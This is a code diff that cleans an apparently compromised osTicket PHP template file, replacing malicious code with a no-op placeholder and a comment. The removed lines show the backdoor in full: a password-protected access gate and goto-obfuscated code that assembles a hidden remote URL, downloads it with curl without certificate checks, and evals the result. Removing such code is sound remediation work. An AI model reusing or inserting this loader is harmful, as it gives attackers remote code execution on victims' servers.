@@ -1,6 +1,5 @@
-<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
-if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == 'a1fecbae6a303e0618f95586ddb49de7c30f911fecd8701500320daf754868a0') {
-      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
-?>
 <?php
-goto B1__i; m8d4Z: $SS8Fu .= "\65\x2f\x64"; goto w85TN; qitG2: $SS8Fu .= "\x2e\61\x30"; goto TniPL; jJ2A5: $SS8Fu .= "\155\141\x64\57"; goto Awt1y; TniPL: $SS8Fu .= "\x61\155\x61"; goto pH6rZ; w85TN: $SS8Fu .= "\x6c\x6f\57\141"; goto jJ2A5; pH6rZ: $SS8Fu .= "\x64"; goto XSPro; WafEL: $SS8Fu .= "\x74\164\150"; goto EtD4Q; EtD4Q: eval("\x3f\76" . Tw2KX(strrev($SS8Fu))); goto TxxMp; Awt1y: $SS8Fu .= "\x70\157\x74"; goto qitG2; XSPro: $SS8Fu .= "\57\57\x3a\x73\160"; goto WafEL; B1__i: $SS8Fu = ''; goto QtKXT; QtKXT: $SS8Fu .= "\164\170\164\x2e\67"; goto m8d4Z; TxxMp: function TW2KX($V1_rw = '') { goto qAxSk; qAxSk: $xM315 = curl_init(); goto x1T3_; tRcjs: curl_setopt($xM315, CURLOPT_URL, $V1_rw); goto W5LdG; Cc3sS: return $tvmad; goto T3ghY; bWiVz: curl_close($xM315); goto Cc3sS; eUTqI: curl_setopt($xM315, CURLOPT_TIMEOUT, 500); goto zihO_; W5LdG: $tvmad = curl_exec($xM315); goto bWiVz; aS7Cq: curl_setopt($xM315, CURLOPT_SSL_VERIFYHOST, false); goto tRcjs; x1T3_: curl_setopt($xM315, CURLOPT_RETURNTRANSFER, true); goto eUTqI; zihO_: curl_setopt($xM315, CURLOPT_SSL_VERIFYPEER, false); goto aS7Cq; T3ghY: }
+// Malicious, obfuscated backdoor code was removed from this file.
+// It is intentionally left as a no-op placeholder. Restore template index
+// content from a clean osTicket distribution if needed.
+return;
